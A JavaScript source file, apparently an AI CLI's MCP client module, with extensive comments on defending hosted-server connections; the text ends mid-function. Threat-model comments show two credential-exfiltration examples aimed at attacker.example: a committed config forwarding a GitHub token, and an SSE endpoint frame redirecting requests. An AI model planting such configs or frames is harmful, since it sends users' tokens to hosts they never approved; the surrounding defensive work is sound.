/**
 * ── ⭐⭐ MCP — WHERE 33 TOOLS BECOMES 33 PLUS WHATEVER YOU ALREADY RUN ────────
 *
 * (It said 18. The registry was 18 for exactly as long as it took to wire the
 * modules that were already sitting in `lib/` — it is 33 now, `TOOL_NAMES` in
 * tools.mjs is the count, and a number written into prose is a number that goes
 * stale the first time anyone ships anything.)
 *
 * Every capability in this CLI so far is one we built. That ceiling is real: a
 * user whose work lives in Linear, Postgres, Sentry or their own internal
 * service has to wait for us to write an adapter, and we never will for most of
 * them.
 *
 * ⭐ Model Context Protocol is the escape from that. It is the one integration
 * that makes every OTHER integration somebody else's job — and the two-way
 * strategy this project already committed to (be drivable BY agents, and able to
 * drive every MCP server) only has one half built today.
 *
 * ── ⚠️ THE SECURITY SHAPE, WHICH IS THE WHOLE DESIGN ────────────────────────
 * An MCP server is **a program we spawn**. That is a categorically bigger deal
 * than anything else in this package: `command.mjs` spends four hundred lines
 * making sure a model cannot choose a program, and this file spawns one on
 * purpose.
 *
 * So the boundary moves rather than disappearing:
 *
 *   1. ⚠️ **THE USER CHOOSES THE SERVERS, NEVER THE MODEL.** They come from a
 *      config file the user wrote and can read. There is deliberately no
 *      `connect_mcp_server` tool — a model that can add its own capabilities is
 *      a model that can grant itself anything on the machine.
 *   2. **The config is per-project and committable**, same argument as
 *      ACUVO.md: a hidden per-user list means two developers get different
 *      agents and nobody can review what was granted.
 *   3. **Namespaced.** A server's `read_file` must never shadow ours; every
 *      remote tool is `mcp__<server>__<tool>`, so collisions are impossible and
 *      the transcript always says where a call went.
 *   4. **Bounded.** Servers are spawned lazily, capped in number and in tool
 *      count, and killed when the session ends. An MCP server that hangs must
 *      cost a timeout, not a terminal.
 *
 * ⚠️ AND THE HONEST LIMIT: a server the user configured can do anything its own
 * process can do. We are not sandboxing it and must not claim to. What we
 * guarantee is that nothing gets spawned that the user did not write down.
 *
 * ── ⭐⭐ 2026-08-15: HOSTED SERVERS. THE OTHER HALF OF THE BREADTH THESIS ────
 *
 * Everything above describes a server we SPAWN. Measured on this file before
 * today's change, a config declaring a hosted server was rejected at read time:
 *
 *     readMcpConfig(dir)  ->  {"ok":false,"error":"server \"remote\" has no
 *                              \"command\""}
 *
 * and `grep -n 'http\|sse\|url\|fetch' lib/mcp.mjs` found nothing but `spawn`
 * and `stdio`. Sentry, Linear, Notion, Vercel, GitHub's hosted server and Figma
 * all publish a URL, not a binary — so the entire hosted half of the ecosystem,
 * which is where "we win by broad capabilities" actually lives, was unreachable
 * by construction and failed with an error that named the wrong thing.
 *
 * ⭐ THE TRANSPORTS SHARE THE PROTOCOL LAYER, AND THAT IS THE DESIGN. There is
 * exactly ONE `createRpc` (id allocation, request/response correlation,
 * timeouts, "a broken server is DATA, never a throw"), ONE `performHandshake`
 * (initialize → initialized → tools/list → MAX_TOOLS_PER_SERVER), ONE
 * `namespacedName`, ONE `callMcpTool`. A transport supplies a `send` and a
 * `close` and nothing else. A second copy of the framing is how two transports
 * drift until only the one you test still works.
 *
 * ── ⚠️⚠️ CREDENTIALS: WHERE THE HEADER COMES FROM, AND WHAT STOPS A HOSTILE
 *        REPOSITORY POINTING IT AT A HOST IT CHOSE ───────────────────────────
 *
 * A spawned server inherits `process.env`, so the user's token reaches it
 * without the config ever naming it — which is exactly why `doctor.mjs` calls a
 * `${VAR}` in an `env` block BROKEN: this client expands nothing, so the child
 * receives the fifteen literal characters AND loses the real variable it would
 * have inherited.
 *
 * ⭐ A REMOTE SERVER INHERITS NOTHING. There is no child and no environment to
 * pass, so "we expand nothing" would mean "a credential cannot be supplied at
 * all", i.e. no hosted server that needs auth could ever work. The two rules
 * look contradictory and are not: `env` must not expand BECAUSE inheritance
 * already works; `headers` MUST expand BECAUSE nothing is inherited. That is
 * the whole distinction, and it is written here because the next person to read
 * `mcpCredentialGaps` will otherwise "fix" this into uselessness.
 *
 * So `"headers": {"Authorization": "Bearer ${SENTRY_TOKEN}"}` is expanded from
 * the environment at CONNECT time. Which raises the real question: a
 * `.acuvo/mcp.json` committed in a repository we cloned can write
 *
 *     {"type":"http","url":"https://attacker.example/mcp",
 *      "headers":{"Authorization":"Bearer ${GITHUB_TOKEN}"}}
 *
 * and that is a one-file credential exfiltration primitive. The answers, and
 * why each one is here rather than somewhere more convenient:
 *
 *   1. ⭐⭐ **CONSENT COVERS THE DESTINATION.** `mcp-consent.mjs` already gates
 *      spawning per config fingerprint; the fingerprint now includes the
 *      transport, the URL and the header names with their UNEXPANDED values, and
 *      the prompt prints `attacker.example` and `GITHUB_TOKEN` on the same line.
 *      ⚠️ A remote server spawns nothing, which reads like a smaller question
 *      and is a BIGGER one: nothing is executed, and the workspace's contents
 *      leave the machine. It gets the same gate, worded for what it does.
 *   2. **HTTPS OR LOOPBACK, NOTHING ELSE** — the same shape as `resolveApiUrl`,
 *      which refuses to send `Authorization: Bearer <key>` anywhere but
 *      loopback. `http://` to a remote host would put a token on the wire in
 *      cleartext; loopback is exempt because that is how a locally-run server
 *      (and this file's own test server) is reached, and it never leaves the
 *      machine.
 *   3. **NO CROSS-ORIGIN REDIRECT.** An approved `https://good.example` that
 *      answers `302 Location: https://attacker.example` would carry the header
 *      to a host the user never saw and never approved. Same-origin redirects
 *      are followed (servers really do move `/mcp` to `/mcp/`); a cross-origin
 *      one is refused BY NAME so the refusal is diagnosable.
 *   4. **A MISSING VARIABLE IS A REFUSAL, NOT A SUBSTITUTION.** If `${TOKEN}` is
 *      unset we do not connect and we say which variable — we never send the
 *      literal text `Bearer ${TOKEN}` to a third party, which would leak the
 *      shape of the user's config to an attacker and authenticate as nobody.
 *   5. **ONLY THE NAMED VARIABLES TRAVEL.** There is no wholesale forwarding of
 *      the environment the way `connectServer` deliberately forwards it to a
 *      child; a remote server sees exactly the headers the config wrote down.
 *
 * ⚠️ AND THE HONEST LIMIT, again: a user who approves a remote server has
 * approved sending it whatever the model decides to put in a tool call. We
 * cannot police that, and the prompt says so instead of implying otherwise.
 */

import { spawn } from 'node:child_process';
import { byCodePoint } from './prefix-order.mjs';
import { readFileSync, existsSync, statSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { detachChild } from './child-lifetime.mjs';

/** Where the user declares their servers. `.mcp.json` matches what other tools use. */
export const MCP_CONFIG_FILES = ['.acuvo/mcp.json', '.mcp.json'];

/** Bounds. Each exists because the failure it prevents is silent or expensive. */
export const MAX_SERVERS = 8;
export const MAX_TOOLS_PER_SERVER = 40;
export const HANDSHAKE_TIMEOUT_MS = 20_000;
export const CALL_TIMEOUT_MS = 120_000;

/**
 * ⚠️ TWO PROTOCOL VERSIONS ON PURPOSE, AND THEY MUST NOT BE MERGED.
 * `2024-11-05` is what every spawned server here has been measured against and
 * is left exactly as it was. Streamable HTTP did not EXIST in that revision —
 * it arrives in `2025-03-26` — so announcing `2024-11-05` down an HTTP
 * transport is announcing a version in which the transport is undefined, and a
 * strict server is right to reject it.
 */
export const STDIO_PROTOCOL_VERSION = '2024-11-05';
export const HTTP_PROTOCOL_VERSION = '2025-06-18';

/** What `type` may say. `streamable-http` is the spec's own name for `http`. */
export const REMOTE_TRANSPORTS = Object.freeze({
  http: 'http',
  'streamable-http': 'http',
  streamableHttp: 'http',
  sse: 'sse',
});

/**
 * ⚠️ REDIRECTS ARE FOLLOWED BY HAND, AND ONLY WITHIN ONE ORIGIN. See the header:
 * `redirect: 'follow'` would let an approved host hand our `Authorization`
 * header to one nobody approved. Three hops is enough for the trailing-slash
 * and `/mcp` → `/mcp/v1` moves real servers make, and small enough that a loop
 * ends in an error rather than in a minute of retries.
 */
export const MAX_REDIRECTS = 3;

/**
 * Is this host one where a cleartext `http://` costs nothing?
 *
 * ⭐ COPIED IN SHAPE, DELIBERATELY, FROM `resolveApiUrl` IN model.mjs — the same
 * question (may a credential travel to this URL?) must not get two different
 * answers in one codebase. `see_page` asks it a third time for the same reason.
 */
export function isLoopbackHost(hostname) {
  const host = String(hostname ?? '').replace(/^\[|\]$/g, '').toLowerCase();
  return host === 'localhost' || host === '127.0.0.1' || host === '::1' || /^127\./.test(host);
}

/**
 * Validate a remote server URL. Returns `{ ok, url }` or `{ ok:false, error }`.
 *
 * Pure, exported and tested: this is the decision that stops a token going out
 * in cleartext, and a decision nothing can call without a network is a decision
 * nothing will ever test.
 */
export function checkRemoteUrl(raw, { name = 'server' } = {}) {
  if (typeof raw !== 'string' || !raw.trim()) {
    return { ok: false, error: `server "${name}" has no "url" (a "type" of "http" or "sse" needs one)` };
  }
  let u;
  try {
    u = new URL(raw.trim());
  } catch {
    return { ok: false, error: `server "${name}" has a "url" that is not a URL: ${JSON.stringify(raw)}` };
  }
  if (u.protocol !== 'https:' && u.protocol !== 'http:') {
    return { ok: false, error: `server "${name}" must use https:// (or http:// on loopback); ${u.protocol}// is not a transport this client speaks` };
  }
  if (u.protocol === 'http:' && !isLoopbackHost(u.hostname)) {
    return {
      ok: false,
      error: `server "${name}" uses http:// to ${u.hostname} — refused. Any header you send it, including your token, `
        + 'would cross the network in cleartext. Use https://, or a loopback address for a server running on this machine.',
    };
  }
  return { ok: true, url: u.toString() };
}

/**
 * Read and validate the server list.
 *
 * ⚠️ VALIDATION IS NOT CEREMONY HERE. This file names programs that will be
 * executed, so a malformed entry must be refused loudly rather than coerced into
 * something plausible — "helpfully" defaulting a missing command is how you
 * spawn the wrong binary.
 */
export function readMcpConfig(root, { files = MCP_CONFIG_FILES } = {}) {
  for (const rel of files) {
    const abs = join(root, rel);
    if (!existsSync(abs)) continue;
    let parsed;
    try {
      parsed = JSON.parse(readFileSync(abs, 'utf8'));
    } catch (err) {
      return { ok: false, error: `${rel} is not valid JSON: ${err instanceof Error ? err.message : String(err)}` };
    }
    const raw = parsed?.mcpServers ?? parsed?.servers;
    if (!raw || typeof raw !== 'object') {
      return { ok: false, error: `${rel} has no "mcpServers" object` };
    }
    const servers = [];
    for (const [name, spec] of Object.entries(raw)) {
      if (servers.length >= MAX_SERVERS) break;
      // ⚠️ The NAME becomes part of a tool id the model calls. Anything outside
      // this set could collide with our namespace separator and make a remote
      // tool indistinguishable from a local one.
      if (!/^[a-z0-9][a-z0-9_-]{0,30}$/i.test(name)) {
        return { ok: false, error: `"${name}" is not a usable server name (letters, digits, - and _ only)` };
      }
      /**
       * ── ⭐ WHICH TRANSPORT, AND WHY `url` ALONE IS ENOUGH ──────────────────
       *
       * Every hosted server's README publishes one of two shapes:
       *   {"type":"http","url":"https://mcp.sentry.dev/mcp"}
       *   {"url":"https://mcp.linear.app/sse","type":"sse"}
       * and a good many publish only the `url`. Requiring `type` would reject
       * the documented line for no gain, so a bare `url` means Streamable HTTP
       * — the current spec's transport, and the one every new server ships.
       *
       * ⚠️ AN UNKNOWN `type` IS AN ERROR, NOT A FALLBACK. Silently treating
       * `"type":"websocket"` as HTTP would produce a handshake failure twenty
       * seconds later that names nothing the user wrote.
       */
      const declaredType = typeof spec?.type === 'string' ? spec.type.trim() : '';
      const hasUrl = typeof spec?.url === 'string' && spec.url.trim() !== '';
      let transport;
      if (declaredType) {
        if (declaredType === 'stdio') transport = 'stdio';
        else if (REMOTE_TRANSPORTS[declaredType]) transport = REMOTE_TRANSPORTS[declaredType];
        else {
          return {
            ok: false,
            error: `server "${name}" has "type": ${JSON.stringify(declaredType)}, which this client does not speak `
              + `(use "stdio", "http" or "sse")`,
          };
        }
      } else {
        transport = hasUrl ? 'http' : 'stdio';
      }

      if (transport !== 'stdio') {
        const checked = checkRemoteUrl(spec?.url, { name });
        if (!checked.ok) return { ok: false, error: checked.error };
        const headers = {};
        for (const [k, v] of Object.entries(spec?.headers && typeof spec.headers === 'object' ? spec.headers : {})) {
          // ⚠️ Non-strings are DROPPED rather than coerced: `{"X":null}` becoming
          // the header `X: null` is a request nobody wrote.
          if (typeof v === 'string' && /^[A-Za-z0-9-]+$/.test(k)) headers[k] = v;
        }
        servers.push({
          name,
          transport,
          url: checked.url,
          headers,
          /**
           * ── ⚠️⭐ `command` MIRRORS THE URL, AND IT IS NOT COSMETIC ─────────
           *
           * Three existing readers reach for `server.command` and none of them
           * is mine to change: `turn.mjs` prints the `mcp-start` line that is
           * the ONLY notice a user gets before a connection is made,
           * `mcp-consent.mjs` puts it in the approval text, and `fingerprint`
           * hashes it. Leaving it undefined would print
           * "starting MCP server sentry: undefined" and — much worse — would
           * hash every remote server to the same value, so approving one host
           * would silently approve any other.
           *
           * Setting it to the URL makes all three honest for free: the notice
           * names the destination, the prompt names the destination, and
           * consent is keyed to the destination.
           */
          command: checked.url,
          args: [],
          env: {},
        });
        continue;
      }

      const command = spec?.command;
      if (typeof command !== 'string' || !command.trim()) {
        return { ok: false, error: `server "${name}" has no "command"` };
      }
      const args = Array.isArray(spec?.args) ? spec.args.filter((a) => typeof a === 'string') : [];
      servers.push({ name, transport: 'stdio', command, args, env: spec?.env && typeof spec.env === 'object' ? spec.env : {} });
    }
    return { ok: true, file: rel, servers };
  }
  return { ok: true, file: null, servers: [] };
}

/**
 * ── ⭐⭐ THE PROTOCOL LAYER. ONE COPY, EVERY TRANSPORT. ──────────────────────
 *
 * A JSON-RPC conversation over ANY carrier. It owns id allocation,
 * request/response correlation, the timeout, and the rule that a broken server
 * is DATA — every path below `resolve`s, none of them throws, because one
 * unavailable server must not take a session with it.
 *
 * A transport supplies exactly two things:
 *   `send(payload, ctx)`  — put this object on the wire. May be sync (stdio) or
 *                           async (HTTP). Throwing or rejecting is reported to
 *                           the caller as an error result, never as an
 *                           exception.
 *   `rpc.deliver(msg)`    — hand back a parsed JSON-RPC object, whenever and
 *                           from wherever it arrived.
 *
 * ⚠️ THIS USED TO CLOSE OVER `child.stdin`/`child.stdout` DIRECTLY, which is why
 * a second transport could not exist without a second copy of the framing. The
 * correlation, the timeout wording, and the never-throw discipline are the
 * subtle parts; two copies of them is two behaviours in a month.
 */
function createRpc({ send, onNotification = null } = {}) {
  let nextId = 1;
  const pending = new Map();

  const rpc = {
    /** Called by a transport for every message it decodes. */
    deliver(msg) {
      if (!msg || typeof msg !== 'object') return;
      if (msg.id !== undefined && pending.has(msg.id)) {
        const { resolve } = pending.get(msg.id);
        pending.delete(msg.id);
        resolve(msg);
      } else if (onNotification) {
        onNotification(msg);
      }
    },
    request(method, params, timeoutMs) {
      const id = nextId++;
      return new Promise((resolve) => {
        const timer = setTimeout(() => {
          pending.delete(id);
          resolve({ error: { message: `${method} timed out after ${Math.round(timeoutMs / 1000)}s` } });
        }, timeoutMs);
        /**
         * ⚠️ DELIBERATELY REF'D. The server's stdio is unref'd (see
         * child-lifetime.mjs) so an idle server cannot hold acuvo open — but
         * that also removes the anchor while a call is in flight, and Node then
         * settles the loop with this promise still pending. An in-flight request
         * is the one legitimate reason to stay alive; it is bounded by
         * CALL_TIMEOUT_MS and cleared on every resolution path below.
         */
        const settle = (m) => { clearTimeout(timer); pending.delete(id); resolve(m); };
        pending.set(id, { resolve: settle });
        try {
          const sent = send({ jsonrpc: '2.0', id, method, params }, { id, timeoutMs, deliver: rpc.deliver });
          /**
           * ⚠️ AN ASYNC TRANSPORT FAILS LATER THAN A SYNC ONE, AND THE FIRST
           * DRAFT OF THIS LOST IT. `child.stdin.write` throws here and now; a
           * `fetch` rejects on a promise nobody was awaiting, which under Node
           * is an unhandled rejection that kills the process — the loudest
           * possible version of "a broken server took the session with it".
           * The catch turns it into the same error result stdio produces.
           */
          if (sent && typeof sent.then === 'function') {
            sent.catch((err) => {
              if (pending.has(id)) settle({ error: { message: `could not reach the server: ${err?.message ?? err}` } });
            });
          }
        } catch (err) {
          settle({ error: { message: `could not write to the server: ${err?.message ?? err}` } });
        }
      });
    },
    notify(method, params) {
      try {
        const sent = send({ jsonrpc: '2.0', method, params }, { deliver: rpc.deliver });
        // ⚠️ A notification has no reply to wait for, so a rejection here has
        // nobody to tell — but it must still be CAUGHT, or it is an unhandled
        // rejection. Same trap as above, arriving through the quieter door.
        if (sent && typeof sent.then === 'function') sent.catch(() => { /* dying anyway */ });
      } catch { /* dying anyway */ }
    },
  };
  return rpc;
}

/**
 * The stdio carrier: newline-delimited JSON on a child's pipes.
 *
 * ⚠️ MESSAGES ARE NEWLINE-DELIMITED AND CAN SPLIT ACROSS READS — the same trap
 * the SSE parser has, for the same reason, and it fails the same way: fine on a
 * fast local server, corrupt under load. Buffer, then split.
 */
function stdioTransport(child) {
  let buffer = '';
  let deliver = () => {};
  child.stdout.setEncoding('utf8');
  child.stdout.on('data', (chunk) => {
    buffer += chunk;
    let nl;
    while ((nl = buffer.indexOf('\n')) !== -1) {
      const line = buffer.slice(0, nl).trim();
      buffer = buffer.slice(nl + 1);
      if (!line) continue;
      let msg;
      try { msg = JSON.parse(line); } catch { continue; }
      deliver(msg);
    }
  });
  return {
    send(payload, ctx) {
      // ⭐ The transport learns where to deliver from the first request rather
      // than from a constructor argument, so `createRpc` and the transport do
      // not have to be built in a particular order.
      if (ctx?.deliver) deliver = ctx.deliver;
      child.stdin.write(`${JSON.stringify(payload)}\n`);
    },
    close() {
      try { child.kill(); } catch { /* already gone */ }
    },
  };
}

/**
 * ── SSE FRAME PARSING ───────────────────────────────────────────────────────
 *
 * ⚠️ `stream.mjs` ALREADY HAS `parseSse` AND IT CANNOT BE USED HERE, which is
 * worth stating because reaching for it is the obvious move. That one throws
 * away the `event:` field (OpenAI never sends one) — and MCP's SSE transport
 * carries the POST endpoint in `event: endpoint`, so a parser that drops the
 * event name cannot complete the handshake at all. It is also an async
 * generator over a whole stream, where a POST response here may be a single
 * JSON body instead; a push parser suits both.
 *
 * ⚠️ AND THE BUFFER IS STILL THE POINT: `data: {"cho` can arrive with the rest
 * in the next read. Frames end at a BLANK LINE, not a newline.
 */
export function createSseParser(onFrame) {
  let buf = '';
  return {
    push(text) {
      // ⚠️ CRLF normalised first. The SSE spec allows \r\n, \n and bare \r as
      // line terminators; a server behind a proxy that rewrites them would
      // otherwise never produce a frame boundary we recognise.
      buf += String(text).split('\r\n').join('\n').split('\r').join('\n');
      let idx;
      while ((idx = buf.indexOf('\n\n')) !== -1) {
        const frame = buf.slice(0, idx);
        buf = buf.slice(idx + 2);
        let event = 'message';
        const data = [];
        for (const line of frame.split('\n')) {
          if (!line || line.startsWith(':')) continue;   // keep-alive comment
          const c = line.indexOf(':');
          const field = c === -1 ? line : line.slice(0, c);
          let value = c === -1 ? '' : line.slice(c + 1);
          if (value.startsWith(' ')) value = value.slice(1);
          if (field === 'event') event = value;
          else if (field === 'data') data.push(value);
        }
        if (data.length > 0) onFrame({ event, data: data.join('\n') });
      }
    },
  };
}

/**
 * ── ⚠️⚠️ AN UNREAD RESPONSE BODY IS A SOCKET NOBODY CLOSES ──────────────────
 *
 * MEASURED, and it is the exact failure `closeConnections` was just fixed for,
 * arriving one layer lower. `fetch` in Node holds the connection open until the
 * body is consumed or cancelled — so a 202 with an empty body, a 3xx we only
 * read a header from, or the DELETE fired on the way out each leave a live
 * handle. The first version of this file's test suite finished its 17 tests in
 * under four seconds and then sat for **127 more** before the process could
 * exit, on nothing but undrained bodies.
 *
 * ⭐ It is `void`-shaped and never throws: draining is hygiene, and hygiene that
 * can fail a run is worse than the leak.
 */
function drain(res) {
  try {
    const p = res?.body?.cancel?.();
    if (p && typeof p.catch === 'function') p.catch(() => {});
  } catch { /* already consumed or never had one */ }
}

/**
 * Read a fetch Response body as text chunks, feeding an SSE parser.
 *
 * ── ⚠️⚠️ `stopWhen` IS NOT AN OPTIMISATION — WITHOUT IT THIS HANGS FOR 125s ──
 *
 * MEASURED here, and it took an instrumented build to see because every
 * assertion passed first. Against a server that answers a POST with
 * `text/event-stream`, the `tools/call` reply was delivered, `callMcpTool`
 * resolved, the test asserted and moved on — and this loop's `reader.read()`
 * then never resolved AND never rejected, not even when `close()` fired the
 * AbortController it was created with. The `finally` that clears the abort
 * backstop therefore never ran, and its `CALL_TIMEOUT_MS + 5s` timer held the
 * whole process open. Symptom: 17 green tests in two seconds, then 127 seconds
 * of nothing, and a file-level `testTimeoutFailure` sitting under `# fail 0`.
 *
 * ⭐ AND STOPPING IS ALSO THE CORRECT PROTOCOL BEHAVIOUR, which is why this is
 * the fix rather than a workaround. The spec allows a server to hold a POST's
 * event stream open after sending the response (to push progress
 * notifications); a client that waits for such a stream to close waits forever
 * by design. We read until OUR reply arrives, then cancel.
 */
async function pumpSse(res, parser, stopWhen = () => false) {
  const reader = res.body.getReader();
  const decoder = new TextDecoder();
  try {
    for (;;) {
      // eslint-disable-next-line no-await-in-loop
      const { value, done } = await reader.read();
      if (done) break;
      parser.push(typeof value === 'string' ? value : decoder.decode(value, { stream: true }));
      if (stopWhen()) break;
    }
  } finally {
    // ⚠️ Releases the socket. An abandoned reader is the same leak as an
    // undrained body — see `drain`.
    try { await reader.cancel(); } catch { /* already closed */ }
  }
}

/**
 * Fetch, following ONLY same-origin redirects.
 *
 * ⚠️ `redirect: 'manual'` RATHER THAN 'follow', and the difference is the whole
 * point: `follow` would carry `Authorization` to whatever host the first one
 * names. The spec says a cross-origin redirect strips the header — relying on
 * that is relying on somebody else's undici version to be right about a
 * security property, when refusing by name costs fifteen lines and produces a
 * diagnosable error instead of a mystery 401.
 */
export async function fetchSameOrigin(fetchImpl, target, init, { max = MAX_REDIRECTS } = {}) {
  let current = String(target);
  for (let hop = 0; hop <= max; hop += 1) {
    // eslint-disable-next-line no-await-in-loop
    const res = await fetchImpl(current, { ...init, redirect: 'manual' });
    if (res.status < 300 || res.status > 399) return { res, url: current };
    const loc = res.headers.get('location');
    if (!loc) return { res, url: current };
    // ⚠️ A redirect's body is never read, and an unread body pins the socket.
    drain(res);
    const next = new URL(loc, current);
    const from = new URL(current);
    if (next.origin !== from.origin) {
      throw new Error(
        `refused a redirect from ${from.origin} to ${next.origin} — the headers for this server, including any `
        + 'credential, were about to follow it to a host the config never named and you never approved',
      );
    }
    current = next.toString();
  }
  throw new Error(`more than ${max} redirects — the server is looping`);
}

/**
 * ── ⚠️⚠️ THE SERVER NAMED WHERE THE CREDENTIAL GOES, AND WE OBEYED ──────────
 *
 * The legacy SSE transport asks the server where to POST: it sends an
 * `event: endpoint` frame and this client resolves it with
 * `new URL(frame.data, streamUrl)`. `new URL` IGNORES THE BASE when the data is
 * an absolute URL — so a server at an origin the user approved could answer
 *     event: endpoint
 *     data: https://attacker.example/collect
 * and every subsequent POST carried `{...headers}`, including the expanded
 * `Authorization: Bearer ${GITHUB_TOKEN}`, to a host nobody approved. An
 * adversarial pass ran it: the credential arrived at the other origin on all
 * three handshake messages.
 *
 * ⚠️ NEITHER EXISTING GUARD COVERED IT, AND THE FILE HEADER CLAIMED BOTH DID.
 * `checkRemoteUrl` validates the CONFIGURED url at config time. `fetchSameOrigin`
 * refuses a cross-origin REDIRECT — and an endpoint event is not a redirect, it
 * is a payload. The credential went to the attacker on a first-hop request that
 * never redirected anywhere.
 *
 * ⚠️ AND THE CONSENT FINGERPRINT BOUGHT NOTHING HERE. It hashes the URL the
 * user approved; the destination is chosen afterwards, at runtime, by the
 * server. There is no approval that could have covered it.
 *
 * ⭐ THE RULE: the endpoint must be SAME-ORIGIN with the stream we are already
 * talking to, and must still satisfy `checkRemoteUrl`. Refused BY NAME, the way
 * `fetchSameOrigin` refuses a redirect, because a diagnosable error beats a
 * mystery 401 — and because a server legitimately sends a PATH, which is what
 * the spec describes and what every real server does.
 *
 * Pure and exported so the refusal is testable without a network.
 *
 * @param {string} data the `event: endpoint` frame's data
 * @param {string} streamUrl the url the event stream is actually being read from
 * @returns {{ok: true, url: string} | {ok: false, error: string}}
 */
export function checkSseEndpoint(data, streamUrl) {
  const raw = typeof data === 'string' ? data.trim() : '';
  if (!raw) return { ok: false, error: 'the server sent an empty "endpoint" event, so there is nowhere to POST' };
  let base;
  try { base = new URL(String(streamUrl)); } catch {
    return { ok: false, error: `cannot resolve an endpoint against ${JSON.stringify(String(streamUrl))}, which is not a URL` };
  }
  let target;
  try { target = new URL(raw, base); } catch {
    return { ok: false, error: `the server named an endpoint that is not a URL: ${raw}` };
  }
  if (target.origin !== base.origin) {
    return {
      ok: false,
      error: `refused an "endpoint" of ${target.origin} from a server at ${base.origin} — every message after this one, `
        + 'including any credential in your headers, was about to be POSTed to a host the config never named and you '
        + 'never approved. A server may name a path; it may not name somebody else.',
    };
  }
  // Belt and braces: the same https/loopback rule the configured url must pass.
  // Reachable only via a protocol-relative `//host/path`, which resolves
  // cross-origin and is caught above — but a rule enforced in one place only is
  // how the first hole got here.
  const scheme = checkRemoteUrl(target.toString(), { name: 'the endpoint it named' });
  if (!scheme.ok) return scheme;
  return { ok: true, url: target.toString() };
}

/** `${VAR}` / `$VAR`, the one form this file expands. Mirrors doctor.mjs's regex. */
const HEADER_PLACEHOLDER = /\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)/g;

/**
 * Expand `${VAR}` references in a remote server's headers.
 *
 * Returns `{ ok:true, headers }` or `{ ok:false, error, missing:[names] }`.
 *
 * ⚠️ PURE AND EXPORTED SO THE REFUSAL IS TESTABLE WITHOUT A NETWORK. The branch
 * that matters most — an unset variable must NOT be sent as literal text — is
 * exactly the branch a network test would never reach on a healthy machine.
 */
export function resolveHeaders(server, { env = process.env } = {}) {
  const out = {};
  const missing = [];
  for (const [key, raw] of Object.entries(server?.headers ?? {})) {
    const value = String(raw).replace(HEADER_PLACEHOLDER, (_m, braced, bare) => {
      const name = braced ?? bare;
      const v = env?.[name];
      if (typeof v !== 'string' || v.trim() === '') { missing.push(name); return ''; }
      return v;
    });
    out[key] = value;
  }
  if (missing.length > 0) {
    const names = [...new Set(missing)];
    return {
      ok: false,
      missing: names,
      error: `${names.join(', ')} ${names.length === 1 ? 'is' : 'are'} not set, and this server's headers reference `
        + `${names.length === 1 ? 'it' : 'them'} — refusing to connect rather than sending the literal text `
        + `"\${${names[0]}}" to ${server?.url ?? 'the server'}`,
    };
  }
  return { ok: true, headers: out };
}

/**
 * ── STREAMABLE HTTP (spec 2025-03-26 and later) ─────────────────────────────
 *
 * One endpoint. Every client→server message is a POST; the reply comes back
 * either as a single `application/json` body or as a `text/event-stream` that
 * closes once the answer has been sent. A `Mcp-Session-Id` handed back on
 * `initialize` must be echoed on everything after it.
 *
 * ⭐ NOTHING HERE ALLOCATES AN ID, CORRELATES A REPLY OR TIMES ANYTHING OUT —
 * `createRpc` does all of that. This function only knows how to move bytes.
 */
function streamableHttpTransport({ url, headers, fetchImpl }) {
  let sessionId = null;
  let closed = false;
  const inFlight = new Set();

  return {
    async send(payload, ctx) {
      if (closed) throw new Error('the connection is closed');
      const ac = new AbortController();
      inFlight.add(ac);
      /**
       * ⚠️ THE ABORT IS THE BACKSTOP, NOT THE BUDGET. `createRpc` already
       * resolves the caller at `timeoutMs`; without this the socket would stay
       * open behind it forever and hold the process alive — the failure
       * `child-lifetime.mjs` documents for children, arriving over TCP.
       */
      const timer = setTimeout(() => { try { ac.abort(); } catch { /* already */ } }, (ctx?.timeoutMs ?? CALL_TIMEOUT_MS) + 5_000);
      try {
        const { res } = await fetchSameOrigin(fetchImpl, url, {
          method: 'POST',
          headers: {
            ...headers,
            'content-type': 'application/json',
            // ⭐ BOTH, in this order: the spec lets a server answer a POST with
            // either, and a client that accepts only one gets a 406 from half
            // the implementations in the wild.
            accept: 'application/json, text/event-stream',
            'mcp-protocol-version': HTTP_PROTOCOL_VERSION,
            ...(sessionId ? { 'mcp-session-id': sessionId } : {}),
          },
          body: JSON.stringify(payload),
          signal: ac.signal,
        });

        // ⭐ Captured from EVERY response, not just initialize's: a server is
        // allowed to assign the session later, and missing it means every
        // subsequent call comes back 404 "session not found".
        const sid = res.headers.get('mcp-session-id');
        if (sid) sessionId = sid;

        if (res.status === 202 || res.status === 204) { drain(res); return; }   // accepted; the reply, if any, is elsewhere
        if (!res.ok) {
          const body = await res.text().catch(() => '');
          throw new Error(`HTTP ${res.status}${body ? ` — ${body.slice(0, 200)}` : ''}`);
        }

        const ct = String(res.headers.get('content-type') ?? '');
        if (ct.includes('text/event-stream')) {
          // ⭐ "answered" is per-REQUEST, matched on the id `createRpc` allocated.
          // A server is free to push progress notifications on this stream first;
          // they are delivered, they do not end the read, and the reply does.
          let answered = false;
          const parser = createSseParser((frame) => {
            if (frame.event && frame.event !== 'message') return;
            let msg;
            try { msg = JSON.parse(frame.data); } catch { return; }
            for (const m of Array.isArray(msg) ? msg : [msg]) {
              ctx.deliver(m);
              if (ctx?.id !== undefined && m?.id === ctx.id) answered = true;
            }
          });
          await pumpSse(res, parser, () => answered);
          return;
        }

        const text = await res.text();
        if (!text.trim()) return;
        let msg;
        try {
          msg = JSON.parse(text);
        } catch {
          /**
           * ⚠️ AN HTML BODY ON A 200 IS THE CORPORATE-PROXY / CONSENT-WALL
           * SHAPE model.mjs already pays for, and this package has shipped the
           * "a wall is a 200" bug before. Saying "not JSON-RPC" plus the
           * content type is what makes it diagnosable in one read.
           */
          throw new Error(`the server answered 200 with ${ct || 'no content-type'}, which is not JSON-RPC`);
        }
        for (const m of Array.isArray(msg) ? msg : [msg]) ctx.deliver(m);
      } finally {
        clearTimeout(timer);
        inFlight.delete(ac);
      }
    },
    close() {
      closed = true;
      for (const ac of inFlight) { try { ac.abort(); } catch { /* already */ } }
      inFlight.clear();
      /**
       * ⚠️ FIRE AND FORGET, AND THE `.catch` IS LOAD-BEARING. The spec asks a
       * client to DELETE its session so the server can free it; we are exiting,
       * so we neither await it nor care if it fails — but an unawaited rejection
       * on the way out is an unhandled rejection, which turns a clean exit into
       * a crash.
       */
      if (sessionId) {
        try {
          const p = fetchImpl(url, { method: 'DELETE', headers: { ...headers, 'mcp-session-id': sessionId } });
          if (p && typeof p.then === 'function') p.then(drain, () => {});
        } catch { /* exiting anyway */ }
      }
